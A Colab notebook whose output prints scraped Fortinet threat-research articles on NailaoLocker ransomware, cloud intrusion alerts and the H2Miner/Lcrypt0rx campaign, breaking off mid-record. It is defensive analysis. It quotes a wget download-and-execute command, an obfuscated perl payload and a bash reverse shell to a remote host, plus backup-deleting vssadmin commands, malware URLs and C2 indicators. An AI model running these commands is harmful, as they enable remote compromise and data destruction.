{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "from google.colab import drive\n",
        "drive.mount('/content/drive')\n",
        "BASE_PATH='/content/drive/MyDrive/LLM_TKIG'"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wQjp1QPnZtmV",
        "outputId": "997e8d66-0e2d-4be1-86cf-b91a2aa75b63"
      },
      "id": "wQjp1QPnZtmV",
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Mounted at /content/drive\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "e55a5a4b",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "e55a5a4b",
        "outputId": "ad501b75-c89f-4fd2-c0d7-0972e7272eb0"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "✅ Loaded 427 records from /content/drive/MyDrive/LLM_TKIG/data/processed/merged_threat_intelligence.json\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[{'title': 'FortiGuard Labs Threat Research',\n",
              "  'content': 'FortiGuard Labs Threat Research FortiGuard Labs analyzes NailaoLocker ransomware, a unique variant using SM2 encryption and a built-in decryption function. Learn how it works, why it matters, and how Fortinet protects against it. ByKuan-Yen LiuandYen-Ting LeeJuly 18, 2025 FortiGuard Labs Threat Research FortiCNAPP Composite Alerts link weak signals into clear timelines—helping security teams detect cloud-native threats earlier and triage them faster. ByDavid AdamsonJuly 17, 2025 FortiGuard Labs Threat Research FortiCNAPP Labs uncovers Lcrypt0rx, a likely AI-generated ransomware variant used in updated H2Miner campaigns targeting cloud resources for Monero mining. ByAkshat PradhanJuly 16, 2025 FortiGuard Labs Threat Research Discover how FortiSandbox 5.0 detects Dark 101 ransomware, even with sandbox evasion tactics. Learn how advanced behavioral analysis blocks file encryption, system tampering, and ransom note deployment. ByBryan LuJuly 14, 2025 FortiGuard Labs Threat Research Explore how AI is changing the cat-and-mouse dynamic of cybersecurity, from cracking obfuscation and legacy languages to challenging new malware built with Flutter, Rust, and Delphi. ByAxelle ApvrilleJuly 10, 2025 FortiGuard Labs Threat Research FortiGuard Labs explores how NordDragonScan utilizes an effective distribution network for dissemination. Learn more. ByCara LinJuly 07, 2025 FortiGuard Labs Threat Research FortiGuard Labs analyzes RondoDox, a stealthy new botnet targeting TBK DVRs and Four-Faith routers via CVE-2024-3721 and CVE-2024-12856. Learn how it evades detection, establishes persistence, and mimics gaming and VPN traffic to launch DDoS attacks. ByVincent LiJuly 03, 2025 FortiGuard Labs Threat Research Threat actor impersonates Colombian government to deliver DCRAT via phishing email, using obfuscation, steganography, and PowerShell payload chains. ByAriel LitvakJuly 01, 2025 FortiGuard Labs Threat Research Explore a detailed technical analysis of a Havoc Remote Access Trojan (RAT) variant used in a targeted cyberattack against Middle East critical national infrastructure. Learn how Fortinet detects and protects against Havoc-based threats. ByXiaopeng ZhangandJohn SimmonsJune 23, 2025 FortiGuard Labs Threat Research FortiGuard Labs has uncovered an ongoing cyberattack, targeting companies in Taiwan using phishing emails disguised as tax-related communications. Read more. ByPei Han LiaoJune 17, 2025 Copyright © 2025 Fortinet, Inc. All Rights Reserved',\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research'},\n",
              " {'title': 'NailaoLocker Ransomware’s “Cheese”',\n",
              "  'content': 'FortiGuard Labs Threat Research Built-In Decryption or Just Another Trap? Affected Platforms: Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Most files on the compromised machines are encryptedSeverity Level:High FortiGuard Labs recently ran across NailaoLocker, a ransomware variant targeting Microsoft Windows systems. Like many ransomware families, it uses AES-256-CBC to encrypt user files. What sets it apart is the presence of hard-coded SM2 cryptographic keys and a built-in decryption function—an uncommon combination that raises immediate questions about intent. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The name “Nailao,” which means “cheese” in Chinese, may be more than a naming quirk. This ransomware could represent a rare opportunity: a payload with embedded recoverability. Or it could be bait—a trap laid to mislead victims and security researchers. One victim’s solution may, in this case, be another’s cheese. In this blog, we examine NailaoLocker’s complete technical profile, including its execution flow, encryption and decryption routines, and use of SM2 cryptography. We assess whether this variant introduces a genuine threat or exposes an exploitable flaw. NailaoLocker is delivered to the target system as a set of three files: Execution begins when the attacker triggers usysdiag.exe, which loads the malicious sensapi.dll using a DLL side-loading technique. This DLL decrypts and loads the actual ransomware payload (usysdiag.exe.dat) directly into memory. To minimize forensic traces, NailaoLoader frees its own library from memory and deletes sensapi.dll immediately after execution. To prevent multiple instances from running simultaneously, NailaoLocker creates a mutex named lockv7. After loading, NailaoLocker checks a hard-coded value against the string \"XXXX\" to determine which mode to activate: encryption or decryption. This variant does not support command-line arguments for mode selection, indicating that the switch is built-in and may be reserved for internal use or testing. Before execution proceeds, the ransomware performs a series of setup tasks. It launches a console window to display real-time status updates, signaling no intent to conceal its activity. It also creates a log file at %ProgramData%\\\\lock.log, where it records progress throughout the encryption or decryption process. In encryption mode, the ransomware retrieves the ransom note from its own binary using a simple XOR decoding routine. This note is later dropped into the affected directories. To optimize performance, NailaoLocker uses a multi-threaded architecture coordinated through Windows I/O Completion Ports (IOCP). This design enables high-throughput encryption or decryption across multiple processor cores. An I/O Completion Port is initialized by calling CreateIoCompletionPort(). The main thread performs file system traversal and submits target file handles to the IOCP queue. Meanwhile, each worker thread waits for a handle to appear in the queue. When a file is received, the thread proceeds with encryption or decryption as appropriate. This model decouples file discovery from processing, allowing the ransomware to efficiently scale across available CPU resources. The GetSystemInfo() function is invoked to determine the number of logical processors available on the system. Using this information, the ransomware creates at least eight worker threads to handle concurrent file operations. This guarantees a baseline level of parallelism, even on lower-core systems. In the next section, we examine the two distinct execution modes—encryption and decryption—and provide a detailed analysis of their functionality. A distinctive feature of this NailaoLocker variant is its inclusion of a hard-coded SM2 key pair embedded in ASN.1 DER format. These keys are used during both encryption and decryption. As shown in Figure 1, the embedded key structure contains a public key and a private key. The public key, based on elliptic curve cryptography, includes x and y coordinates that define a point on the SM2 curve. The private key—rarely seen in ransomware samples—is also present, suggesting a potential test build or alternate use case. After extraction, the keys are initialized using the OpenSSL function EVP_PKEY_CTX_new(). Mapping from the hard-coded string “SM2”, the numerical identifier is set to 0x494 and is passed to the encryption function. This is further supported by the presence of the expected curve OID—06 08 2A 81 1C CF 55 01 82 2D—within the ASN.1 structure. When running in encryption mode, NailaoLocker performs two primary tasks: identifying target files and encrypting them using AES-256-CBC. It also appends a ransom note to each affected directory. NailaoLocker begins by enumerating all logical drives on the system. It recursively searches accessible directories for files to encrypt, while deliberately skipping specific system paths and file types to avoid destabilizing the infected host. Excluded file extensions: Excluded directories and files: Once a target file is identified, its handle is pushed to the IO Completion Port queue for processing by a worker thread. A ransom note is also dropped into each of the enumerated directories. Each file sent to the I/O Completion Port is processed by a worker thread, which executes the encryption routine using a unique AES key and IV. At the start of each thread, NailaoLocker allocates memory for 38 _OWORD (16-byte) elements. This space is used to store the AES key, IV, their SM2-encrypted versions, and related metadata. The ransomware uses BCryptGenRandom() to generate a 32-byte AES key and a 16-byte IV for each file: These values are used for file encryption with the AES-256-CBC algorithm. Instead of securing the AES key and IV with RSA, as is common in ransomware, NailaoLocker uses SM2, an elliptic curve cryptographic algorithm. This appears to be the first documented case of SM2 being used to protect symmetric file encryption keys in ransomware. Because SM2 does not produce a fixed-length output, the ransomware stores the sizes of the encrypted AES key and IV in two _WORD fields. The full memory layout includes: For each target file, NailaoLocker appends the .locked extension and sets the file attribute to FILE_ATTRIBUTE_HIDDEN. It then reads up to 0x10000 bytes (64 KB) of data per operation. The ransomware performs encryption using the AES-256-CBC algorithm through OpenSSL’s EVP interface. The process includes: The encrypted data replaces the original content. To facilitate decryption, the ransomware assigns a LARGE_INTEGER (8 bytes) to hold the original file size. This value is stored in thefirst 8 bytesof the encrypted file, allowing the decryptor to navigate to the footer containing key material. After the encrypted payload, the ransomware appends a structured footer. It begins with a 4-byte marker 47 56 37 00 (\"LV7\") to indicate the start of the encryption key section. The original file content was shifted to storing the file size. Also, the encryption padding extends the file size. These bytes are not able to fit in the space before the “LV7” flag and are placed after the encrypted AES key and IV. Following the \"LV7\" marker, NailaoLocker stores all remaining cryptographic and overflow data in a fixed sequence. This layout is color-coded in Figure 15: Once encryption is complete, NailaoLocker restores the file’s original last edit timestamp and renames it with the .locked extension (if not already applied). It then prints the total encryption duration to the console in the format done [time], where [time] represents the duration of the encryption operation. In decryption mode, the ransomware requires the SM2 private key to reconstruct the AES key and IV, which are stored at the end of each encrypted file. It then traverses each directory to find encrypted files and performs the decryption process to restore them to their original status. In this section, we will detail the process and validate the correctness of the built-in ASN.1 DER format of the SM2 private key. To initiate decryption mode, we modify the hard-coded value to be the same as \"XXXX,\" prompting the ransomware to switch modes. Upon switching to decryption mode, the file traversal function is adjusted to search for files with the \".locked\" extension, adding them to the IO Completion Port queue for processing. Again, at least eight threads are created to accelerate the decryption process. Each thread begins by parsing the footer of the encrypted file. The ransomware locates the \"LV7\" marker and reads the data that follows: The SM2 private key, extracted earlier from the embedded ASN.1 DER block, is used to decrypt both the AES key and IV. Once the AES key and IV are recovered, the file content is decrypted using AES-256-CBC via OpenSSL’s EVP interface: Unfortunately, in testing, the embedded SM2 private key failed to correctly decrypt the AES key, suggesting the key material may be incomplete or deliberately non-functional. However, FortiGuard analysts confirmed that when the correct AES key and IV are manually supplied—captured during encryption—the decryption function performs as expected and successfully restores the original file contents. This analysis provides a detailed technical profile of NailaoLocker, a ransomware variant notable for its embedded SM2 key pair and built-in decryption function. Although the embedded SM2 private key is non-functional in practice, testing confirms that the decryption logic operates correctly when supplied with valid AES key material, indicating this may be an in-development strain or internal test build. The use of the Chinese SM2 cryptographic standard, particularly to protect AES file encryption keys, marks a notable divergence from conventional ransomware practices. FortiGuard Labs will continue to monitor for the further adoption of region-specific algorithms and for signs that NailaoLocker is evolving toward active deployment. FortiGuard Labs detects the NailaoLocker ransomware samples with the following AV signatures: FortiEDR,FortiXDR, andFortiDeceptorprovide additional protection by detecting anomalous behavior, halting malicious encryption attempts in real time, and diverting ransomware away from production environments. All protections are continuously updated based on real-time intelligence shared across Fortinet’s global sensor network, partner CERTs, and trusted threat intelligence alliances. Fortinet recommends all organizations maintain a strong ransomware defense posture that includes: If you feel your organizations has been impacted by NailaoLocker or any other ransomware, our globalIncident Responseteam can assist with detection, containment, remediation, and recovery. 1248c4b352b9b1325ef97435bd38b2f02d21e2c6d494a2218ee363d9874b760746f3029fcc7e2a12253c0cc65e5c58b5f1296df1e364878b178027ab26562d6860133376a7c8e051da787187761e596ce9b3d0cfcea21ed8f434992aa7cb8605 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved',\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research/nailaolocker-ransomware-cheese'},\n",
              " {'title': 'Improving Cloud Intrusion Detection and Triage with FortiCNAPP Composite Alerts',\n",
              "  'content': \"FortiGuard Labs Threat Research Detect Cloud Intrusions Faster with Correlated Alerts and Contextual Timelines in FortiCNAPP Moderncyberattacks targeting cloud environmentsare increasingly complex and difficult to detect. Attackers often use multi-stage techniques—such as authentication abuse, privilege escalation, command execution, and interaction withcloud-native APIs—to gain and expand access. Each step in this attack chain often mimics legitimate administrative or developer activity, making it extremely difficult to identify malicious intent. Typical attacker behaviors—such as logging in from a new IP address, accessing previously unused cloud services, or executing command-line processes—can appear indistinguishable from routine actions by developers, admins, or automation. Complicating matters, there is often no single signature, rule, or event that definitively indicates a compromise has occurred. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. As a result, cloud intrusion detection requires examining multiple signals in context. A single weak signal may be inconclusive. But when multiple anomalies involve the same users, resources, or compute nodes over a short period, the likelihood of a targeted intrusion increases significantly. This behavioral correlation is what separates real attacks—or evenpenetration testing—from normal workload activity. FortiCNAPPaddresses this challenge by correlating weak indicators into a coherent picture usingComposite Alertsand theObservation Timeline. The sections below examine how these capabilities work in practice, along with real-world examples that illustrate their value in detecting cloud-native intrusions. To improve detection precision and reduce the burden on security analysts, FortiCNAPP has introduced Composite Alerts. This technology identifies intrusions not by detecting a single event, but by aggregating and correlating multiple indicators associated with the same entity over a defined time window. Each Composite Alert compiles a series of detections, such as suspicious logins, first-time use of administrative APIs, or anomalous container behavior, and links them to specific cloud resources, user identities, or compute instances. Applying a correlation window also allows FortiCNAPP to detect patterns that emerge over minutes or hours rather than the milliseconds of traditional attacks. This approach offers several advantages: As a result, security teams can shift away from reactive alert triage and instead engage in informed, prioritized investigation. By presenting correlated signals with contextual metadata and entity linkage, FortiCNAPP enables analysts to focus their time on evaluating credible threats rather than chasing disconnected anomalies, streamlining the path from detection to resolution. To reduce mean time to triage (MTTT), FortiCNAPP provides each Composite Alert in the form of an Observation Timeline. This timeline serves as both evidence and explanation, enabling the analyst to quickly understand why the alert was generated, which entities were involved, and what sequence of events took place. Each Observation Timeline includes two foundational elements: Once FortiCNAPP has identified a primary entity, such as a compromised IAM user, workload, or compute node, it constructs a timeline by aggregating all related observations for that entity across the alert window. For each observation, the timeline includes: By presenting these elements in a concise, ordered structure, the timeline equips the user to assess the threat in context. This makes it easier to answer key questions, such as: This structured format reduces cognitive load by eliminating the need for analysts to manually reconstruct sequences of activity from disparate logs. It also minimizes investigative overhead by clearly presenting relevant behaviors and their associated metadata in context, enabling faster escalation, more accurate threat classification, and higher-confidence incident response decisions. The first alert involves a machine monitored by a FortiCNAPP agent that was flagged as potentially compromised. Potentially Compromised Host Host machines may have been compromised. The following entities are suspected. Hosts: ip-10-123-45-67 The machine suspected of compromise had the hostname ip-10-123-45-67. Additional host details were available to the end user. The timeline begins on May 13 at 12:00 PM, when FortiCNAPP observed a new vulnerable application installed on the host. Two days later, on May 15 at 10:00 AM, the system launched several new child applications—processes not previously seen originating from this parent process. At 10:36 AM, the timeline flagged a possible reverse shell command. Inspection of the associated command line confirmed it: the host initiated an outbound connection to a remote system, granting that system interactive shell access—even if the machine was behind a firewall or otherwise unreachable from the internet. Further activity that day strengthened the case for compromise. At 12:00 PM, the host contacted a known-bad external domain. At 12:51 PM, it resolved the domain to an internal IP, indicating a successful DNS lookup. By 1:00 PM, it had established an anomalous command-line connection to an external server using wget. This suggests the attacker downloaded and executed malicious code from a remote source. The use of wget with the -qO- flag—which suppresses output and streams the response directly to stdout for execution by a child process—further supports the likelihood of malicious behavior. At this stage, the timeline provides strong evidence of compromise. For further validation, analysts could expand the “+19 more” related entities linked to the “New child application launched” detection. Within this expanded set, multiple command lines reveal obfuscated commands designed to download remote code and execute it locally. This example: /usr/bin/git archive --format=zip --prefix=en --exec=`wget -qO /tmp/QrXErNRt http:// 10.203.118.5:8080/sYdelk;chmod +x /tmp/QrXErNRt;/tmp/QrXErNRt;rm -f /tmp/QrXErNRt` --remote=bOCNVQ/ -- abuses git and wget to download remote code to a file in the tmp directory, execute it, and then clean it up. This example: /usr/bin/git archive --format=zip --prefix=HS --exec=`perl -e 'system(pack(qq,H152,,qq, 62617368202d632027303c263138392d3b65786563203138393c3e2f6465762f7463702f31302e3230332e3131382e352f343434343b7368203c26313839203e2631383920323e2631383927,))'` --remote=dspUKieP/ -- also abuses git, but this time it leverages perl to run an obfuscated script. That obfuscated script, when decoded, is the reverse shell command identified by the syscall detection bash -c 0<&189-;exec 189<>/dev/tcp/ 10.203.118.5/4444;sh <&189 >&189 2>&189 The ability to detect highly obfuscated commands as anomalous and incorporate them into the narrative of a larger suspected attack is a key benefit of FortiCNAPP’s Composite Alerts and of the Observation Timeline feature. This second alert involves AWS identities monitored by FortiCNAPP using CloudTrail logs. Potentially Compromised AWS Keys AWS credentials may have been compromised. The following entities are suspected. Users: AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a; Principal Ids: AROAREDACTEDM9V2Q3LXD:firstname.lastname@redactedcompany.com. In this case, the entity suspected of compromise was the identity AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a, specifically as used by firstname.lastname@redactedcompany.com, as indicated by the principal_id. The timeline began on May 27, when this identity called APIs across 17 AWS regions and 28 different AWS services, suggesting reconnaissance activity. On May 28, the same identity made additional API calls from a previously unseen IP address located outside AWS infrastructure. Over the following two hours, FortiCNAPP observed several additional anomalies associated with this identity, including the use of new services, access to previously used services in new regions, and API calls that resulted in errors. Several of the APIs accessed were sensitive for infrastructure and service discovery. The Lacework customer who received this alert confirmed it as a malicious intrusion. What made this case particularly noteworthy was the absence of an obvious “smoking gun.” Unlike the first example, where reverse shell commands and obfuscated payloads clearly indicated malicious activity, this scenario involved a user behaving anomalously over time in ways that resembled legitimate exploration. The suspicious nature of the behavior became apparent only when the events were viewed in aggregate. FortiCNAPP’s ability to detect this threat did not rely on a single decisive signal. Instead, it resulted from correlating multiple weak signals into a structured timeline. This allowed analysts to determine that a critical mass of suspicious behavior had occurred. This example illustrated the power of Composite Alerts. By aggregating low-signal anomalies that might otherwise be dismissed, FortiCNAPP surfaced a high-fidelity detection—catching the intrusion during the early Discovery phase, before the attacker could escalate privileges or cause damage. Composite Alerts enable security teams to focus on meaningful patterns of behavior that indicate real threats, rather than manually correlating isolated detections. By automatically assembling related signals into a coherent, time-ordered timeline, FortiCNAPP reduces the effort required to identify and respond to cloud-native attacks. Analysts no longer need to reconstruct the narrative from scratch. FortiCNAPP delivers it with supporting evidence and clear entity context. This allows security teams to shift from reactive triage to informed, prioritized investigation. By presenting correlated signals with contextual metadata, FortiCNAPP enables your analysts to focus on credible threats rather than chasing unrelated anomalies. In cloud environments, where attacker dwell times are short and lateral movement can occur quickly, timely and structured detection is essential for containing threats before they escalate into breaches or operational disruptions. FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved\",\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research/improving-cloud-intrusion-detection-and-triage-with-forticnapp'},\n",
              " {'title': 'Old Miner, New Tricks',\n",
              "  'content': 'FortiGuard Labs Threat Research H2miner Resurfaces with Lcrypt0rx Ransomware Affected Platforms:Linux, Windows, ContainersImpacted Users:Any OrganizationImpact:Data Encrypted for Impact, Compute Hijacking, Defacement, Sensitive data stolen.Severity Level:Critical The FortiCNAPP team, part of FortiGuard Labs, recently investigated a cluster of virtual private servers (VPS) used for Monero mining. The identified samples are associated withprior H2miner campaignsthat we documented in 2020 and have since been updated with new configurations. H2Miner is a Crypto mining botnet that has been active since late 2019. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. We also identified a new variant of the Lcryx ransomware, calledLcrypt0rx. Lcryx is a relatively new VBScript-based ransomware strain first observed in November 2024. This family exhibits several unusual characteristics that suggest it may have been generated using AI. This is the first documented instance of operational overlap between H2miner and Lcryx, suggesting the following possibilities: The infrastructure hosts a diverse set of samples, including several commercial tools that target multiple operating systems to maximize financial gain from a victim’s environment. Tool Linux Windows Containers KinSing ✔️ Xmrig miners ✔️ ✔️ ✔️ Lcrypt0rx ✔️ Lumma stealer ✔️ DCRat ✔️ Cobalt Strike ✔️ Amadey ✔️ RustyStealer ✔️ ScreenConnect ✔️ The infrastructure uses multiple VPS providers for hosting and Command & Control. 78[.]153[.]140[.]66 HostGlobal plus VPS 80[.]64[.]16[.]241 LIR limited ISP 89[.]208[.]104[.]175 Aeza international VPS 47[.]97[.]113[.]36 Cobalt Strike server hosted by Hangzhou Alibaba Advertising Co. ISP Bitbucket[.]org Used to host payload in repo sadsafsadfsadf/dsfgdsgssdfgdsg 176[.]65[.]137[.]203 Dolphin host VPS. 185[.]156[.]72[.]96 Amadey C2 server hosted by TOV VAIZ PARTNER. ISP 80[.]64[.]18[.]161 Stimul LLC. 207[.]231[.]109[.]252 HostRush VPS. s10[.]krakenfiles[.]com File hosting used for downloading Lcrypt0rx’s wallpaper. This was uploaded on 30-04-2025 104[.]21[.]32[.]1 / softwareshop[.]win Metasploit C2. We suspect the Lcryx family was generated using AI based on the following indicators: We’ve observed growing adoption of large language models (LLMs) by threat actors in recent years. Combined with the widespread availability of commercial tools, this trend has significantly lowered the barrier to entry for cybercriminal activity. In this next section, we will examine some interesting aspects of the identified samples. H2Miner continues to rely heavily on scripts to disable defenses and expand access, ultimately enabling the deployment of miners. Many of these scripts resemble previously documented variants; however, this version has been updated with new deployment URLs. This script includes code blocks that are structurally similar to earlier H2Miner samples used to terminate security software. However, this variant goes further by also targeting database and user application processes. Additionally, it deploysKinsing malware, establishes persistence by registering itself as a service, and attempts to eliminate competing miners by terminating related processes and clearing associated cron entries. The script then checks for an existing cron entry that downloads and executes itself from 80[.]64[.]16[.]241, and adds the entry if it’s missing. Finally, it clears both the current and persistent shell command history to cover its tracks. This script closely resembles earlier H2Miner scripts used to terminate processes and deploy Kinsing malware, but it includes updated URLs. Notably, the script targets theAlibaba Cloud Security Center agentas well as processes andcontainer images running within Docker, indicating an awareness of cloud-specific defenses and containerized environments. This script functions as aKinsing updater. It removes any existing Kinsing installation and redeploys it by downloading and executing a shell script similar in structure to ce.sh. Several additional scripts identified during this investigation reuse code blocks from ce.sh, spr.sh, and cpr.sh. While their specific logic may vary, their ultimate purpose remains consistent: deployingKinsing, a remote access trojan (RAT) commonly used to deliver crypto miners in compromised environments. Name Md5 Description curl-amd64 dbc9125192bd1994cbb764f577ba5dda Kinsing RAT linked to 2021 Log4j (CVE-2021-44228) campaigns kinsing b3039abf2ad5202f4a9363b418002351 Kinsing RAT linked to Openfire (CVE-2023-32315) attacks in 2023. kinsing_aarch64 da753ebcfe793614129fc11890acedbc Kinsing Sample used in Apache ActiveMQ (CVE-2023-46604) attacks in 2023. libsystem.so ccef46c7edf9131ccffc47bd69eb743b Kinsing rootkit observed in the wild in late 2020. This PowerShell script downloads anXMRig Monero minerfrom 78[.]153[.]140[.]66 and saves it to the system’s temporary directory as sysupdate. It then creates a scheduled task using schtasks with the name\"Update service for Windows Service\"to ensure persistence. The script’s structure closely resembles those used in early 2021 mining campaigns and appears to have been reused for current operations. Notably, this XMRig miner is also deployed by theLcrypt0rx ransomwarevariant. The associated configuration file (ff1706b37fea16d75b739a5396d9ffba) points to theMonero wallet:4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC This wallet has been previously linked to H2Miner campaigns dating back to late 2021, indicating continuity or overlap in its operator. This usage of older scripts and samples with updated configurations and hosting URLs points to a resurgence of older campaigns from2020and2021. Analysis of this sample shows that it follows the following step-by-step process: Lcrypt0rx first checks if it is running with administrator privileges. If not, it relaunches itself with elevated rights using Shell.Application to invoke wscript.exe with the /elevated flag. Once elevated, the script disables a range of system utilities and user protections by modifying the Windows Registry. These include: It also disables the execution of several critical tools: Lcrypt0rx then attempts to establish persistence by adding its full path to theWinlogon Shellregistry key and registering itself as anImage File Execution Options (IFEO)debugger for cmd.exe. However, these attempts fail because the script path is addedwithout prependingwscript.exe, rendering the entries non-functional. Using WMI, the script then forcibly terminates taskmgr.exe, msconfig.exe, and regedit.exe. It also modifies theScancode Mapregistry to disable a wide range of keys, including: Mouse buttons are reversed, and all changes are applied immediately to disrupt user control. From (Hex) From (Key) To (Hex) To (Key) Notes E05B Left Windows 0000 Disabled Disable Left Win E05C Right Windows 0000 Disabled Disable Right Win 001D Left Ctrl 0000 Disabled Disable Left Ctrl E01D Right Ctrl 0000 Disabled Disable Right Ctrl 002A Left Shift 0000 Disabled Disable Left Shift 0036 Right Shift 0000 Disabled Disable Right Shift 0038 Left Alt 0000 Disabled Disable Left Alt E038 Right Alt (AltGr) 0000 Disabled Disable Right Alt 003B F1 0000 Disabled Disable F1 E053 Delete (Ext) 0000 Disabled Disable Delete E000 Null? (invalid) 0000 Disabled Malformed entry? 003C F2 0000 Disabled Disable F2 003D F3 0000 Disabled Disable F3 002E C 0000 Disabled Disable C 0032 M 0000 Disabled Disable M 0020 D 0000 Disabled Disable D 0014 T 0000 Disabled Disable T 001E A 0000 Disabled Disable A 001F S 0000 Disabled Disable S 0025 K 0000 Disabled Disable K 0031 N 0000 Disabled Disable N 0022 G 0000 Disabled Disable G 0012 E 0000 Disabled Disable E 0013 R 0000 Disabled Disable R 0017 I 0000 Disabled Disable I 0044 F10 0000 Disabled Disable F10 Next, the script marks itself asread-only,hidden, andsystem-protected, and proceeds to overwrite theMaster Boot Record (MBR)—a destructive move that renders the system unbootable. Lcrypt0rx then attempts to disable Windows Defender real-time protection, BitDefender, and Kaspersky. However, the methods used for BitDefender and Kaspersky are ineffective—likely artifacts of LLM hallucinations. The firewall is disabled via netsh. An 8,192-character master key is then generated using ASCII values 1–255, and a per-file salt of equal length is appended to it during the encryption process. This key-salt pair is used to XOR-encode each file’s content. Folders selected for encryption include standard directories and OneDrive backups. System recovery is disrupted by: cmd.exe /c vssadmin delete shadows /all /quietcmd.exe /c wbadmin delete catalog -quiet Next, a ransom note is dropped in multiple locations (Desktop, Documents, Pictures, Videos, Downloads, Music) and opened in Notepad. The message demands$1,000(up from $500 in earlier samples) and shortens the payment deadline from 5 to 3 days. The .onion URL in the note is syntactically incorrect and doesn\\'t match the one shown in the desktop wallpaper, which uses an obsolete V2 TOR address, suggesting a placeholder or reuse by H2Miner actors. An image from https://s10[.]krakenfiles[.]com/uploads/30-04-2025/605q6HLKTv/image[.]jpg is then downloaded and set as the desktop background by editing the HKCU\\\\Control Panel\\\\Desktop\\\\Wallpaper registry key. The TOR address in the image aligns with older Lcryx variants. Lcrypt0rx then establishes fallback persistence by dropping and registering multiple embedded scripts via run keys. This time, persistence works correctly, with the scripts executed using wscript.exe and marked as read-only, system-protected, and hidden. A summary of the scripts is listed below: Full path Description C:\\\\Windows\\\\SysWOW64\\\\msvcr80.dll.bat Ping’s ragebot[.]fun, a game cheat developer site. C:\\\\Windows\\\\System32\\\\systemconfig.exe.vbs Denial-of-Service script that floods the system\\'s network interface’s gateway and ragebot[.]fun with 45 MB HTTP POSTs. C:\\\\Windows\\\\advapi32_ext.vbs Uses taskkill to kill targeted processes, including popular AV processes like Avast, Windows Defender, Kaspersky, AVG, Norton, Protegent360, AvGuard, McAfee McShield, etc., in an infinite loop. C:\\\\Windows\\\\System32\\\\USB_bridge.vbs Monitors for any newly connected drive and then copies itself over. Likely a prototype script. C:\\\\Windows\\\\CDConnector.vbs Monitors for any connected CD drive and attempts to eject it. C:\\\\Windows\\\\System32\\\\slmgr.bat.vbs Launches itself with the windows hidden and continuously displays a message box demanding ransom payments. It also resets the system time to 00:00, likely in an attempt to confuse system logs. The script then modifies the hosts file to block AV-related domains and disables cmd.exe for the current user by setting: HKEY_CURRENT_USER\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System\\\\DisableCMD Lcrypt0rx then downloads and executes miners and infostealers before finally entering the encryption routine.This section is not seen in older Lcryx samples. The details about the executables are listed below. URL MD5 Description http://89[.]208[.]104[.]175:5002/ime3[.]exe 9e4f149dae1891f1d22a2cea4f68432e A Trojan with fake Google resources that is primarily used for disabling defences and Monero mining. It modifies the hosts file to block popular AV sites, adds defender whitelisting via PowerShell, removes the MSRT update via wusa.exe, disables Windows updates via sc.exe, creates a service persistence for itself, and escalates privileges via BYOVD technique for the vulnerable driver WinRing0.sys http://89[.]208[.]104[.]175:5002/piperpate[.]exe a729410de4dc397d1fb2ab8f7ae560d3 Lumma stealer. C2s: disciplipna[.]top/eqwu, praetori[.]live/vepr, opusculy[.]top/keaj, scriptao[.]digital/vpep, civitasu[.]run/werrp\", , exitiumt[.]digital/xane, viriatoe[.]live/laopx, brandihx[.]run/lowp, triremeo[.]digital/akds https://bitbucket[.]org/sadsafsadfsadf/dsfgdsgssdfgdsg/downloads/MicrosoftSoftware[.]exe 2726145d4ef3b34d3c3a566177805c39 Injector that checks for debugger and then injects DCRat. http://47[.]97[.]113[.]36:10010/02[.]08[.]2022[.]exe 1aee8a425ea53c571a16b8efde05ba01 Cobalt Strike C2 : 47[.]97[.]113[.]36 http://176[.]65[.]137[.]203/music-play[.]exe B6cd214bb814362694cc48299ebaf0e5 A Trojan that drops .bat files that execute xmrig miners from temp. The IP range also hosts a Metasploit reverse shell for Windows and Linux with C2 callbacks to 176[.]65[.]138[.]172 & softwareshop[.]win. The range also hosts web shells. http://185[.]156[.]72[.]121/test/exe/random[.]exe 0680df49e1866c86697028ea73d28d28 Amadey Infostealer. C2s: 185[.]156[.]72[.]96/te4h2nus/index.php mutex: 006700e5a2ab05704bbb0c589b88924d\" encryption_key: NGEyYjFkNzk0ZTc5YTQ1MzJiNmUyYjY3OTQwOGQyYmI= http://80[.]64[.]18[.]161/files/6051142952/8QivM1I[.]exe d3884cc519c6855ae20d64264d5f6e93 RustyStealer. It also executes multiple PowerShell commands that add folder exclusion for users\\\\<username> and appdata\\\\local\\\\packages to defender, creates runonce and scheduled task persistence for itself. These scripts have minor syntactical errors. http://78[.]153[.]140[.]66/xmrig[.]exe 57f0fdec4d919db0bd4576dc84aec752 Same Xmrig miner that was downloaded by H2miner script 1.ps1\\xa0 6868c280c61c0b1e2ab8bf6792f1eef2 https://207[.]231[.]109[.]252/bin/support[.]client[.]exe 44143827116c96f5dcace4f95dff8697 ConnectWise ScreenConnect. The config used for Monero mining points to the following wallets for mining payouts: Lcrypt0rx now enters a persistent loop that continuously scans the previously enumerated directories and any attached storage volumes for new files to encrypt. Each file is processed through an encryption routine with multiple checks and conditions. The routine begins by attempting to open the file using the OpenTextFile method in 